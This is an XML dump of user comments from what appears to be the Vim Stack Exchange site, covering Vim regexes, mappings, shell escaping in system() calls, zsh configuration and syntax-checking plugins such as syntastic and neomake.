  <row Id="12831" PostId="7763" Score="0" Text="\v%(^|\n)\s*i?%(nore)?ab%[brev]\s+%(%(\&lt;expr\&gt;|\&lt;buffer\&gt;)\s+){,2}(\k+) is not working on my vimrc file" CreationDate="2016-05-12T19:06:10.193" UserId="7597" />
  <row Id="12832" PostId="7763" Score="0" Text="@JoobLee It works on my system, do you have any error message? Does it work with a more simple (but less reliable) regex like `\vi?abbr\s+(\k+)`? Could you give me a link with an excerpt of your abbreviations, to see if I can reproduce your issue?" CreationDate="2016-05-12T19:12:36.187" UserId="6960" />
  <row Id="12834" PostId="7763" Score="0" Text="@JoobLee If your Vim version is recent enough, add the `n` flag to the substitute call (I've edited the answer to include it). If you do a search in your `vimrc` and you copy-paste this `\v^\s*i?%(nore)?ab%[brev]\s+%(%(\&lt;expr\&gt;|\&lt;buffer\&gt;)\s+){,2}\zs\k+`, does it highlight your abbreviations?" CreationDate="2016-05-12T19:26:58.390" UserId="6960" />
  <row Id="12835" PostId="7766" Score="1" Text="To match newlines with `\s`: [`\_s`](http://vimhelp.appspot.com/pattern.txt.html#%2F%5C_s)." CreationDate="2016-05-12T20:05:59.787" UserId="205" />
  <row Id="12836" PostId="7705" Score="1" Text="Does Neovim support patterns with `syn keyword`? I think Vim doesn't - all it allows is an optional tail (or abbreviation)." CreationDate="2016-05-12T20:08:20.160" UserId="205" />
  <row Id="12837" PostId="7742" Score="0" Text="Thank you very much for your help." CreationDate="2016-05-13T04:46:25.737" UserId="3302" />
  <row Id="12838" PostId="7776" Score="1" Text="thanks for alternate solution, new command to learn.. I'll wait for any other answers.. plus this one requires lot of steps in which case I can as well stick to `grep`" CreationDate="2016-05-13T07:26:20.800" UserId="1616" />
  <row Id="12839" PostId="7733" Score="0" Text="Your last version works perfectly. You're a genius !" CreationDate="2016-05-13T07:48:53.170" UserId="3357" />
  <row Id="12840" PostId="7777" Score="1" Text="thanks, lot of info here, will go through and ask further questions if needed" CreationDate="2016-05-13T08:11:39.117" UserId="1616" />
  <row Id="12841" PostId="7779" Score="1" Text="Since you want your map to be used, you will need `normal` instead of `normal!`. My leader is `\​`, and I can use `normal \a` to execute the mapping, but I don't know how to keep it generic wrt leader." CreationDate="2016-05-13T08:13:33.700" UserId="1296" />
  <row Id="12842" PostId="7778" Score="0" Text="thanks, will check out the link and help" CreationDate="2016-05-13T08:13:39.750" UserId="1616" />
  <row Id="12843" PostId="7779" Score="0" Text="@PhilippFrank: Thanks for your comment, please see my update: Replacing `&lt;leader&gt;` by its value is not really what I'm looking for." CreationDate="2016-05-13T08:20:23.877" UserId="1841" />
  <row Id="12844" PostId="7779" Score="0" Text="Do you mind using and external command/function for this?" CreationDate="2016-05-13T08:20:46.567" UserId="1821" />
  <row Id="12845" PostId="7189" Score="0" Text="Is it possible to filter a single word? (not line level)" CreationDate="2016-05-13T08:25:20.403" UserId="301" />
  <row Id="12846" PostId="7779" Score="0" Text="@Nobe4: I'd like a solution as straightforward as possible but if it is the only solution that will be ok :-)" CreationDate="2016-05-13T08:27:59.843" UserId="1841" />
  <row Id="12847" PostId="7629" Score="0" Text="Is there any other suggestion for such a closure command? I noticed that &lt;C-W&gt; is bad. For Linux support." CreationDate="2016-05-13T08:32:52.750" UserId="2923" />
  <row Id="12848" PostId="7780" Score="1" Text="Thanks for your solution! I made it a one-liner to avoid the use of the function: `command! -nargs=1 NormLead  execute &quot;normal &quot; . (get(g:,&quot;mapleader&quot;,&quot;\\&quot;)==' ' ? &quot;1&quot; : get(g:,&quot;mapleader&quot;,&quot;\\&quot;)) . &lt;f-args&gt;`: it is still not perfect (doesn't work with special keys or with combinations beginning with 2 leaders) but that's something" CreationDate="2016-05-13T09:19:41.057" UserId="1841" />
  <row Id="12849" PostId="7780" Score="1" Text="Nice, I'll add this to the answer" CreationDate="2016-05-13T09:20:16.917" UserId="1821" />
  <row Id="12851" PostId="7777" Score="2" Text="so, I tried these... `ddma:g/^# /t'a-` is the best fit I could do.. `'a-` also gives the lines in same order as occurs in file, which I needed..  `:h :t` conveniently has help on `:m` as next item, so I now know how to move the filtered lines :)" CreationDate="2016-05-13T09:38:07.673" UserId="1616" />
  <row Id="12852" PostId="7777" Score="1" Text="Nice, let me add this to the answer!" CreationDate="2016-05-13T09:42:12.873" UserId="1821" />
  <row Id="12854" PostId="7785" Score="0" Text="Oops, I've been searching `:h C-@`. I feel a bit ashamed now. Thanks!" CreationDate="2016-05-13T09:56:33.363" UserId="5036" />
  <row Id="12855" PostId="7785" Score="1" Text="A lot of help topic begins with `CTRL` ;-)" CreationDate="2016-05-13T09:58:19.640" UserId="1841" />
  <row Id="12859" PostId="7783" Score="0" Text="Thanks! I didn't know the right way to look for the manual was to use `&lt;S-Insert&gt;`. I mistaked to use `:h &lt;Shift-Ins&gt;`." CreationDate="2016-05-13T10:14:05.553" UserId="7366" />
  <row Id="12860" PostId="7783" Score="1" Text="Yes it's not always obvious, when in doubt you can just type `&lt;S` and then use autocomplete" CreationDate="2016-05-13T10:28:58.073" UserId="1841" />
  <row Id="12861" PostId="7629" Score="0" Text="In normal mode pressing ZZ will &quot;Save and Quit&quot; while ZQ will quit without saving. Both are very quick, no need for a chord to press." CreationDate="2016-05-13T12:45:21.470" UserId="895" />
  <row Id="12862" PostId="5803" Score="0" Text="@trusktr you should post an answer to your own question so this can be marked answered." CreationDate="2016-05-13T13:04:08.863" UserId="895" />
  <row Id="12863" PostId="7741" Score="1" Text="couldn't do with regex, but using external commands `:%! echo &quot;[$(sed &quot;s/.*/'&amp;',/&quot; % | tr '\n' ' ' | sed 's/, $//')]&quot;`" CreationDate="2016-05-13T13:04:54.363" UserId="1616" />
  <row Id="12865" PostId="7787" Score="1" Text="Could you please up update your question to clarify what you mean by 'files of visual selection'? Especially of is formatted your list of files? Are the separated by comas, by whitespaces, by new lines?" CreationDate="2016-05-13T13:53:55.597" UserId="1841" />
  <row Id="12867" PostId="7784" Score="0" Text="(point 8 in romainl's answer)" CreationDate="2016-05-13T14:01:10.427" UserId="205" />
  <row Id="12869" PostId="7787" Score="0" Text="@Masi Does my update answers your question?" CreationDate="2016-05-13T14:23:15.053" UserId="1841" />
  <row Id="12872" PostId="7788" Score="3" Text="The best vimrc really depends on the user, I think you should drive your question towards specific configuration points (navigation, search, plugins) instead of searching for the &quot;best vimrc&quot;.&#xA;(also because mine is the best ;) )" CreationDate="2016-05-13T16:10:24.647" UserId="1821" />
  <row Id="12873" PostId="7788" Score="2" Text="also worth reading: https://www.fullstackpython.com/vim.html" CreationDate="2016-05-13T16:11:09.400" UserId="1821" />
  <row Id="12874" PostId="7788" Score="2" Text="check out these as well: https://realpython.com/blog/python/vim-and-python-a-match-made-in-heaven/ and https://github.com/klen/python-mode" CreationDate="2016-05-13T16:19:58.367" UserId="1616" />
  <row Id="12875" PostId="7788" Score="0" Text="Also, instead of looking for python, I would really recommend trying doing with &quot;raw&quot; vim and incrementing as your need comes. I think it's worth trying and adding bits of config now and then. But if you search for the &quot;best&quot; config, I would say: https://confluence.jetbrains.com/display/PYH/Configuring+PyCharm+to+work+as+a+Vim+editor" CreationDate="2016-05-13T16:22:10.470" UserId="1821" />
  <row Id="12876" PostId="7772" Score="0" Text="This is what I was originally thinking...will try now. :g command...need to utilize more than just :gQ" CreationDate="2016-05-13T16:55:21.963" UserId="7607" />
  <row Id="12877" PostId="7772" Score="0" Text="@wbg Glad I could help! For more reading on the `:g` command, see an old question of mine: http://vi.stackexchange.com/q/5091/2920" CreationDate="2016-05-13T16:56:58.223" UserId="2920" />
  <row Id="12878" PostId="7772" Score="1" Text="This works well for me. Other answers are good as well however I'm choosing this one because it worked without tinkering, and is easily grokked." CreationDate="2016-05-13T16:58:15.353" UserId="7607" />
  <row Id="12879" PostId="7768" Score="0" Text="I like this idea but having trouble getting it working." CreationDate="2016-05-13T16:58:59.420" UserId="7607" />
  <row Id="12880" PostId="7788" Score="0" Text="You can see my `.vimrc` here: https://github.com/DJMcMayhem/dotFiles/blob/master/.vimrc They're not all set with python in mind, but IMO they're reasonable and useful starting settings." CreationDate="2016-05-13T17:00:41.043" UserId="2920" />
  <row Id="12881" PostId="5309" Score="0" Text="@Alexey you should post this in as an answer and accept it" CreationDate="2016-05-13T17:42:26.783" UserId="895" />
  <row Id="12882" PostId="7787" Score="1" Text="@Masi: Yup I had left `'&lt;,'&gt;` in the visual mapping now it should work. I recorded a gif to show the result." CreationDate="2016-05-13T17:50:03.817" UserId="1841" />
  <row Id="12883" PostId="5097" Score="0" Text="I guess there is something wrong in your vimrc. You can try an auto command as well." CreationDate="2016-05-13T18:15:26.810" UserId="7161" />
  <row Id="12884" PostId="4167" Score="0" Text="You can search in vim-scripts.org . I have seen vimscript autocompletion plugin there" CreationDate="2016-05-13T18:18:40.017" UserId="7161" />
  <row Id="12897" PostId="7763" Score="0" Text="Yes, Thanks a lots." CreationDate="2016-05-13T22:22:59.407" UserId="7597" />
  <row Id="12898" PostId="4887" Score="0" Text="I've been trying to use this syntax with a regular expression, but I can't get it to work, specifically `g/\\001/:exe &quot;norm! 0dt[a-zA-Z]&quot;`   which I would have expected to delete from the beginning of each line to the first occurance of an alphabetic character, but it doesn't work.   Could you advise please?" CreationDate="2016-05-14T00:22:30.217" UserId="4667" />
  <row Id="12899" PostId="5653" Score="0" Text="That's an awesome tidbit of information! Unfortunately, it does not apply here.  The idea is to map a key so that, as you write code, simply hitting a shortcut key the file is executed." CreationDate="2016-05-14T03:27:01.970" UserId="5465" />
  <row Id="12900" PostId="5653" Score="0" Text="Once again, assuming the file is not (*yet*) executable, since you just started writing it in Vim." CreationDate="2016-05-14T03:28:10.423" UserId="5465" />
  <row Id="12901" PostId="7774" Score="0" Text="With a perfectly valid, **great** answer like this, there's no reason why this question should deserve a negative vote number; even if it *is* from someone who doesn't know the answer or the reason for the question." CreationDate="2016-05-14T03:38:58.993" UserId="5465" />
  <row Id="12902" PostId="5647" Score="0" Text="So far, [this Q/A](http://vi.stackexchange.com/questions/7730/run-file-though-a-command-when-opening-from-explore) fits into this category well." CreationDate="2016-05-14T03:42:02.497" UserId="5465" />
  <row Id="12903" PostId="5536" Score="0" Text="You can refer nathangrigg.net for the vim pdf. That has the entire list of key descriptions. This PDF is extracted from all help contents of vim editor." CreationDate="2016-05-14T05:32:13.010" UserId="7161" />
  <row Id="12905" PostId="7627" Score="0" Text="I extend your answer to many tabs here http://vi.stackexchange.com/q/7782/2923" CreationDate="2016-05-14T06:56:04.477" UserId="2923" />
  <row Id="12906" PostId="7787" Score="1" Text="I'm glad it fits your needs but I don't understand why you added a condition on the OS: both mappings and function should work fine on Windows too. For the gif I use this answer on meta: http://meta.vi.stackexchange.com/a/1322/1841" CreationDate="2016-05-14T09:32:19.127" UserId="1841" />
  <row Id="12907" PostId="7787" Score="0" Text="I corrected the Windows thing. Thank you for the link!" CreationDate="2016-05-14T09:49:33.020" UserId="2923" />
  <row Id="12908" PostId="7800" Score="0" Text="I don't know if it will fix your issue, but maybe you could slightly modify your mappings so that they test if the popup menu is visible or not: `inoremap &lt;expr&gt; &lt;Down&gt; pumvisible() ? '&lt;C-N&gt;' : '&lt;C-O&gt;gj'` and `inoremap &lt;expr&gt; &lt;Up&gt; pumvisible() ? '&lt;C-P&gt;' : '&lt;C-O&gt;gk'`" CreationDate="2016-05-14T10:36:52.730" UserId="6960" />
  <row Id="12909" PostId="7800" Score="0" Text="@user9433424 --- it works! Can you post this as an answer? Thanks!" CreationDate="2016-05-14T10:40:24.870" UserId="854" />
  <row Id="12910" PostId="7798" Score="0" Text="If you do `echo $ABC` in Windows Vim, do you get any output?" CreationDate="2016-05-14T10:58:21.847" UserId="205" />
  <row Id="12911" PostId="7798" Score="0" Text="Yes, it prints c:\temp\" CreationDate="2016-05-14T11:10:08.060" UserId="985" />
  <row Id="12912" PostId="4887" Score="0" Text="t does take a literal argument only, you can't give it a regular expression" CreationDate="2016-05-14T11:13:31.670" UserId="71" />
  <row Id="12913" PostId="7798" Score="1" Text="Based on a loose interpretation of [`:h $HOME`](http://vimhelp.appspot.com/options.txt.html#%24HOME), `${…}` is only for Unix. What if you do `exe 'e' $ABC . &quot;foo&quot;`?" CreationDate="2016-05-14T11:17:10.267" UserId="205" />
  <row Id="12915" PostId="6934" Score="0" Text="Huh, took some time to answer...  @AlexandreMartins vim 7.4, bash 4.3.42(1), Debian testing. [full output](http://pastebin.com/64uppnqH)" CreationDate="2016-05-14T12:48:07.690" UserId="6878" />
  <row Id="12916" PostId="6934" Score="0" Text="@romainl Will try that :)" CreationDate="2016-05-14T12:48:18.190" UserId="6878" />
  <row Id="12917" PostId="6934" Score="0" Text="@romainl My Umlaut issue is also there if I use `:shell`." CreationDate="2016-05-14T12:53:29.070" UserId="6878" />
  <row Id="12918" PostId="6934" Score="0" Text="@statox I currently can't imagine a good situation but sometimes switching to an external shell breaks my workflow. But maybe my workflow is simply ugly ^^" CreationDate="2016-05-14T12:58:04.440" UserId="6878" />
  <row Id="12919" PostId="6934" Score="0" Text="@DanBradbury What are the limitations of `:shell`?" CreationDate="2016-05-14T12:59:42.543" UserId="6878" />
  <row Id="12920" PostId="6934" Score="0" Text="@criztovyl_needs_help Your setup looks pretty standard. Can you clean your '.vimrc' to a smaill subset that still has the problem and paste it in the answer? Also mention your keyboard layout by executing 'cat /etc/default/keyboard'. Let's see if I can reproduce your problem this way. Let me also know which key conbinations do I have to press to get one of the characters you mention." CreationDate="2016-05-14T13:24:23.057" UserId="2132" />
  <row Id="12921" PostId="6934" Score="1" Text="@AlexandreMartins Huh, I'm using [amix's vimrc](https://github.com/amix/vimrc). When removing it issue is gone, so I think it's a problem of amix's vimrc. Will open issue there :)" CreationDate="2016-05-14T14:01:59.507" UserId="6878" />
  <row Id="12922" PostId="6934" Score="0" Text="@criztovyl_needs_help: It's good if you found the cause of the problem. I think you might be interested in [tmux](https://github.com/tmux/tmux) it allows you to split your terminal in several panels, it could be useful to you to have a split containing Vim and another one where you'd issue your terminal commands. That really helped me improving my workflow." CreationDate="2016-05-14T14:56:30.893" UserId="1841" />
  <row Id="12923" PostId="7799" Score="0" Text="Why not try set path command? The files under the directories set in this path will be accessed by gD as well autompletion features too." CreationDate="2016-05-14T15:10:39.727" UserId="7161" />
  <row Id="12924" PostId="6934" Score="0" Text="Good stuff @criztovyl_needs_help . Glad you managed to figure out how to  solve your problem. If you end up figuring out the root cause as well, answer your own question and make someone else's life easier. You may even hog those lovely vi.stackexchange points for yourself. :D" CreationDate="2016-05-14T19:37:21.960" UserId="2132" />
  <row Id="12925" PostId="7803" Score="0" Text="I'm not sure if this will help, but after running my c++ binary I delete it, something like this  ./binary &amp;&amp; rm binary" CreationDate="2016-05-14T23:30:15.850" UserId="1305" />
  <row Id="12926" PostId="7803" Score="2" Text="Why not just do `:!make &amp;&amp; /path/to/exe`? That seems to be working fine for me." CreationDate="2016-05-14T23:40:51.637" UserId="2920" />
  <row Id="12927" PostId="2863" Score="1" Text="Possible duplicate of [CtrlP should never index particular directories](http://vi.stackexchange.com/questions/5099/ctrlp-should-never-index-particular-directories)" CreationDate="2016-05-15T01:43:21.803" UserId="7161" />
  <row Id="12930" PostId="7803" Score="0" Text="You could check, after step 2, if the call to `getqflist()` returns an empty list, or not (you could even parse the list to see if there are errors in it - useful if you expect to have warnings)." CreationDate="2016-05-15T16:40:44.107" UserId="1800" />
  <row Id="12931" PostId="7807" Score="3" Text="I cannot reproduce. Can you try again with `vim -Nu NONE` to avoid customizations and plugins?" CreationDate="2016-05-15T19:44:44.437" UserId="205" />
  <row Id="12932" PostId="7807" Score="0" Text="Ok, this made it work, thank you! How can I find the reason or plugin which interferes?" CreationDate="2016-05-15T19:57:08.600" UserId="7639" />
  <row Id="12934" PostId="7807" Score="3" Text="Try out http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file/" CreationDate="2016-05-15T19:58:20.110" UserId="205" />
  <row Id="12935" PostId="7809" Score="2" Text="Brace-enclosed compound commands are supposed to end with either a newline or a semicolon before the closing brace." CreationDate="2016-05-15T23:57:20.507" UserId="205" />
  <row Id="12936" PostId="7809" Score="1" Text="@muru  nice spotting! your knowledge always impresses me. thanks" CreationDate="2016-05-16T00:11:49.340" UserId="4603" />
  <row Id="12938" PostId="5653" Score="1" Text="@ILMostro_7 so this clearly doesn't have the keybinding, but running `:! perl %` doesn't require the file to be executable, but it does honor the shebang line without having to parse it yourself, though user9433424's solution looks like just what you want" CreationDate="2016-05-16T13:58:38.867" UserId="1828" />
  <row Id="12940" PostId="7811" Score="2" Text="Some plugins such as [YouCompleteMe](http://valloric.github.io/YouCompleteMe/) can run syntax checks on the fly, but they can only do that for a small set of languages.  Most plugins can't do that though, mainly because of limitations in Vim itself.  The forthcoming Vim 8 will finally have full support for job control, and things might change then.  But we aren't there yet." CreationDate="2016-05-16T17:21:07.090" UserId="1577" />
  <row Id="12942" PostId="7811" Score="2" Text="On a side note: syntastic always runs checkers against the file on disk, not against the current buffer. Saving the current buffer to a temporary location and checking that wouldn't work for syntastic because some checkers are run against an entire source tree, rather than against just the current file.  There are other, deeper problems involved too, that are related to limitations in Vim that Emacs doesn't have." CreationDate="2016-05-16T17:24:55.050" UserId="1577" />
  <row Id="12944" PostId="7813" Score="1" Text="I agree, on-the-fly syntax checking is not worth anyone's time." CreationDate="2016-05-16T22:39:00.313" UserId="54" />
  <row Id="12945" PostId="7810" Score="0" Text="That bugfix is disappointing. :( If I do go the wrapper, I'd probably define a variable for each argument or something. Looks like `/proc/&lt;PPID&gt;/cmdline` is the best way on Linux." CreationDate="2016-05-16T22:57:54.833" UserId="205" />
  <row Id="12946" PostId="7814" Score="0" Text="Yes it would be interesting if vim use reliably use zsh. I'm assuming - but could be wrong - that the shell vim uses for `system()` is based on what you have set as your default shell for your UNIX system account. When I have set zsh as default, I have experienced errors in vimdiff so I keep the system shell as bash - then run `exec zsh` at the end of `.bashrc` so vim continues to use bash and I get zsh at prompt. it takes a bit longer to start shell but its workable" CreationDate="2016-05-16T23:01:33.497" UserId="4603" />
  <row Id="12947" PostId="7814" Score="0" Text="Odd, I have never experienced any problems in Vimdiff (my shell is zsh across Ubuntu and Arch Linux systems). Probably a bug fixed in newer Vims." CreationDate="2016-05-16T23:02:41.583" UserId="205" />
  <row Id="12948" PostId="7814" Score="0" Text="I used to get the errors on Ubuntu 14.04 when using vimdiff as `git difftool`. I am now running 16.04 with vim-gtk from pi-rho repo and I just tested changing the shell to zsh. It's now worse, errors in  core vim and more errors in vimdiff. e.g. when running `git difftool`- `&quot;includes-shared/vim/user_setup_commands.sh&quot; [readonly] 310L, 9093C/usr/bin/zsh: can't open input file: globstar&#xA;/usr/bin/zsh: can't open input file: globstar&#xA;&#xA;E810: Cannot read or write temp files&#xA;E97: Cannot create diffs&#xA;`" CreationDate="2016-05-16T23:39:27.973" UserId="4603" />
  <row Id="12949" PostId="7814" Score="0" Text="@the_velour_fog O.o no errors on 14.04 or 16.04. How did you set zsh as your shell?" CreationDate="2016-05-16T23:47:13.213" UserId="205" />
  <row Id="12950" PostId="7814" Score="0" Text="added `set shell=/bin/bash` into `~/.vimrc` seems to have fixed it. so now zsh is the default vim uses bash. I got the idea after searching and finding this &lt;https://coderwall.com/p/lzf7ig/using-vim-with-fish-shell&gt;" CreationDate="2016-05-16T23:48:00.817" UserId="4603" />
  <row Id="12951" PostId="7814" Score="0" Text="I set zsh as the default for my UNIX account by running command `chsh -s /usr/bin/zsh` - then log out and log back in." CreationDate="2016-05-16T23:50:00.813" UserId="4603" />
  <row Id="12952" PostId="7810" Score="0" Text="@muru Aye, if you're not opting for eunuch there are possibly better ways than these wrapper functions and `$SUDO_COMMAND`. Would be interesting to see a full `cmdline` based solution as well!" CreationDate="2016-05-16T23:54:48.973" UserId="5070" />
  <row Id="12953" PostId="7815" Score="5" Text="I suspect `&lt;c-;&gt;` is the same as `;` in your terminal. Press Ctrl-V and then Ctrl-;, you'll likely see just `;`." CreationDate="2016-05-17T01:19:25.277" UserId="205" />
  <row Id="12954" PostId="7815" Score="0" Text="`Ctrl-V` and then `Ctrl+;` give `;`, indeed. `Ctrl-V` and then `;` also give `;`. Isn't `Ctrl-V` the blockwise-visual mode?" CreationDate="2016-05-17T04:24:48.497" UserId="6349" />
  <row Id="12955" PostId="7815" Score="0" Text="`:help i_ctrl-v`… Vim is a modal editor." CreationDate="2016-05-17T05:10:00.013" UserId="54" />
  <row Id="12956" PostId="2904" Score="1" Text="http://stackoverflow.com/questions/11975174/how-do-i-search-the-open-buffers-in-vim" CreationDate="2016-05-17T07:05:06.790" UserId="2038" />
  <row Id="12958" PostId="7815" Score="0" Text="@muru: confirmed here in iterm2, tmux, zsh, as well as the macvim gui." CreationDate="2016-05-17T08:23:53.263" UserId="1821" />
  <row Id="12959" PostId="7818" Score="0" Text="thanks, I needed to use `call system(...)` else vim threw an error. the `#` doesn't seem to be making it to the display command. also the shell command `display` doesnt have a text output. it launches an x gui program. Still testing now.." CreationDate="2016-05-17T10:47:21.347" UserId="4603" />
  <row Id="12960" PostId="7818" Score="0" Text="even if I run `call system('display -size 300x300 xc: &quot;#34495e&quot;')` the display command isn't working as expected." CreationDate="2016-05-17T10:55:13.570" UserId="4603" />
  <row Id="12961" PostId="7820" Score="0" Text="... I was trying to explain the parts I understood and the part I did not in your regexp, thank you very much haha" CreationDate="2016-05-17T10:56:32.073" UserId="7128" />
  <row Id="12962" PostId="7818" Score="0" Text="what is your issue ? can you try with a simpler command (i.e. ls/cat/..) to check if the issue is your command ?" CreationDate="2016-05-17T10:56:40.483" UserId="1821" />
  <row Id="12963" PostId="7820" Score="0" Text="do you understand everything now ? :)" CreationDate="2016-05-17T10:57:21.437" UserId="1821" />
  <row Id="12965" PostId="7818" Score="0" Text="the `display` command is getting an invalid hex value. I wish I could tell you what that value is, but I cant dump the string as we are passing it directly to `system` . I will try `call system('set -x; display -size 300x300 xc: &quot;#34495e&quot;')` now and see if that dumps string vim is passing to shell..." CreationDate="2016-05-17T11:00:46.870" UserId="4603" />
  <row Id="12966" PostId="7822" Score="0" Text="So there is no way to limit the scope to those files that need it?" CreationDate="2016-05-17T11:01:26.653" UserId="2598" />
  <row Id="12967" PostId="7822" Score="1" Text="mh not that I can think of, but you should see `:h internal-variables` to see all options for variable scoping." CreationDate="2016-05-17T11:02:55.603" UserId="1821" />
  <row Id="12968" PostId="7818" Score="1" Text="xtrace is showing that vim seems to invoking the command perfectly `+ display -size 300x300 xc: '#34495e'` it seems your system idea is working, the problem now must be somewhere else. I think this solves the `#` issue anyway. thanks" CreationDate="2016-05-17T11:04:40.043" UserId="4603" />
  <row Id="12969" PostId="7820" Score="0" Text="I think so yes, thank you very much ! I did not know about the &quot;groups&quot; usage, it seems very useful. Two last little questions if you have time : &#xA;1. `*` means &quot;all that remains in the line&quot; ?&#xA; 2. One can not add spaces inside the regexp I suppose (to make it more readable for a newbie like me) as they would be interpretated as litteral white spaces ?" CreationDate="2016-05-17T11:07:13.860" UserId="7128" />
  <row Id="12970" PostId="7820" Score="1" Text="`*` means `any number of` so `.*` means `any number of anything`. I'm not sure about the regex formatting, but once you grasp the concept it shouldn't be too hard to read ;)" CreationDate="2016-05-17T11:09:19.857" UserId="1821" />
  <row Id="12971" PostId="7817" Score="0" Text="@user9433424 thanks, the `shellescape()` looks interesting. I tried your command and it seems to work from the point of dealing with the `#` thanks" CreationDate="2016-05-17T11:10:16.077" UserId="4603" />
  <row Id="12972" PostId="7818" Score="1" Text="turns out it was a space between `xc: #` causing the problem! so this version of your statement: `call system('display -size 300x300 xc:&quot;#' . a:hex_color . '&quot;')` works fine." CreationDate="2016-05-17T11:23:29.300" UserId="4603" />
  <row Id="12973" PostId="7817" Score="0" Text="Did you try `\\#`? See `:help string`." CreationDate="2016-05-17T11:40:14.683" UserId="54" />
  <row Id="12974" PostId="7817" Score="0" Text="@romainl I did think to try that but dimissed the idea because I thought it would only add characters. Im interested to to see what it does though . I will try now..." CreationDate="2016-05-17T11:42:20.330" UserId="4603" />
  <row Id="12975" PostId="7817" Score="0" Text="@romainl it seems the first &quot;\&quot; is getting consumed by vim. i.e. when I xtrace  what the shell is seeing I get `+ display -size 300x300 'xc:\#59a7da'`. I'm still confused by this issue. it seems like vim's user interface, vimscript seems modal too, i.e. the rules about when metacharacters are escaped depends on the command using the string..." CreationDate="2016-05-17T11:55:20.193" UserId="4603" />
  <row Id="12976" PostId="7823" Score="0" Text="Thanks for your answer, it is more in the spirit of what I was looking for, though @Nobe4's regexp was perfect too (and his explanations as well)" CreationDate="2016-05-17T12:10:21.487" UserId="7128" />
  <row Id="12977" PostId="7817" Score="0" Text="`:execute &quot;!echo \\\\#&quot;` or `:execute '!echo \\#`." CreationDate="2016-05-17T12:10:46.107" UserId="54" />
  <row Id="12978" PostId="7817" Score="0" Text="@romainl for example you call an user defined function like `MyFunction('#393939')` and vim will expand the `#`. even though `:h string` claims single quotes give you the literal character. but then `system('... #393939')` won't expand the `#`..." CreationDate="2016-05-17T12:11:37.093" UserId="4603" />
  <row Id="12979" PostId="7817" Score="0" Text="@romainl `:execute '!echo \\#'` and `:execute &quot;!echo \\\\#&quot;` both work, and produce `#` in the shell output. I think that might prove my point. different quoting rules depending on the context the command is run in..." CreationDate="2016-05-17T12:19:20.397" UserId="4603" />
  <row Id="12980" PostId="7825" Score="3" Text="What does not work? Do you get error messages? If this issue is related to the plugin, consider using https://github.com/zchee/deoplete-clang/issues/new" CreationDate="2016-05-17T13:12:01.860" UserId="1821" />
  <row Id="12981" PostId="7825" Score="0" Text="I get no errors. And I don't know why It don't work." CreationDate="2016-05-17T13:15:00.260" UserId="7656" />
  <row Id="12982" PostId="7825" Score="1" Text="I think https://github.com/zchee/deoplete-clang/issues/new is the best place to ask your question if this particular plugin is not working." CreationDate="2016-05-17T13:36:45.553" UserId="1821" />
  <row Id="12983" PostId="7821" Score="0" Text="The preferred way would be to leave the two copies alone.  The `errorformat` shouldn't change more often than once in a few years, so who cares.  Trying to make it &quot;shared&quot; creates a problem instead of solving one.  If you use a global variable, you need to make sure it's initialised before either checker gets to run.  If you use a common include you're writing more code than you're avoiding." CreationDate="2016-05-17T14:29:50.047" UserId="1577" />
  <row Id="12985" PostId="7821" Score="0" Text="It's a misleading question.  The solution for your particular setup is not the solution that should be used &quot;in general&quot;." CreationDate="2016-05-17T14:33:39.257" UserId="1577" />
  <row Id="12986" PostId="7821" Score="0" Text="@lcd047 you are quite right, I rewrote the question to separate the actual question and the context." CreationDate="2016-05-17T14:38:30.337" UserId="2598" />
  <row Id="12987" PostId="7832" Score="0" Text="Because it already takes another argument?" CreationDate="2016-05-17T14:52:42.513" UserId="4505" />
  <row Id="12988" PostId="7832" Score="0" Text="Makes sens, but it's strange that vim does not accept a {motion} followed by something else (if that's the explanation)" CreationDate="2016-05-17T14:59:01.297" UserId="1821" />
  <row Id="12989" PostId="7827" Score="2" Text="I knew that `i` took a count, but it never occurred to me that I could actually use it for something useful.  Thanks!  It should be noted that this is repeatable using `.`, in which case, it may be better to use `80a-&lt;esc&gt;` to keep the cursor at the end of the inserted text." CreationDate="2016-05-17T15:03:11.607" UserId="5229" />
  <row Id="12990" PostId="7832" Score="1" Text="I think you mean `viwra`. Uppercase 'R' replaces the whole line regardless of what's visually selected." CreationDate="2016-05-17T15:03:27.517" UserId="7654" />
  <row Id="12991" PostId="7832" Score="0" Text="What if you want to replace the character under the cursor with i, move to the next word, and insert something after the first letter?" CreationDate="2016-05-17T15:04:45.417" UserId="4505" />
  <row Id="12992" PostId="7832" Score="4" Text="`r` is a command, not an operator. Operators operate on a text-object or motion but that's not the case for `r`, like `i` or `a` or `o`." CreationDate="2016-05-17T15:05:29.897" UserId="54" />
  <row Id="12993" PostId="7832" Score="0" Text="@Lawrence, I'd do the same as when I try to uppercase only one letter: `gUl`, so `rli`. It's not ideal, but at least I think it gives consistency." CreationDate="2016-05-17T15:07:48.297" UserId="1821" />
  <row Id="12994" PostId="7832" Score="0" Text="@romainl: good point, I would never think of applying a motion to `i`,`a` or `o`." CreationDate="2016-05-17T15:08:52.863" UserId="1821" />
  <row Id="12996" PostId="7832" Score="1" Text="Wouldn't `graiw` be better?  Would be similar to `g~iw`.  I don't think the behaviour you want is better than being able to replace the current character with two keystrokes." CreationDate="2016-05-17T15:14:09.290" UserId="4505" />
  <row Id="12997" PostId="7832" Score="0" Text="@Lawrence, you're right, I'm just guessing here what would make sens. But obviously as romainl said, commands are not operators, I think the explanation ends here... As for a workaround, mapping gr could be a good idea." CreationDate="2016-05-17T15:17:24.020" UserId="1821" />
  <row Id="12998" PostId="7831" Score="0" Text="Hi Luc, thanks for the information. That BTW framework seems to be quite extensive. I might give it a try." CreationDate="2016-05-17T16:05:55.763" UserId="5328" />
  <row Id="12999" PostId="7813" Score="0" Text="&quot;... on-the-fly syntax checking is not worth anyone's time&quot; - Could you please add that comment to your answer? I will then accept it." CreationDate="2016-05-17T16:05:59.767" UserId="7644" />
  <row Id="13000" PostId="7834" Score="1" Text="flake8 is not very effective in finding bugs. Personally I prefer `pylint`." CreationDate="2016-05-17T18:30:17.073" UserId="6625" />
  <row Id="13001" PostId="7834" Score="0" Text="Thanks, I tried the other ones and pyflakes seems to work pretty well, will try pylint later. This is strange as flake8 works very well back in Vim with synastic." CreationDate="2016-05-17T18:33:00.823" UserId="7563" />
  <row Id="13002" PostId="7834" Score="0" Text="If your code is interpreted as Python3 and you want to use Python2 version of Pylint, use `g:neomake_python_pylint_exe = 'pylint2'` in your settings. Replacing pylint2 to the name of your checker binary. Refer for more information: https://github.com/neomake/neomake/issues/340" CreationDate="2016-05-17T18:34:41.127" UserId="6625" />
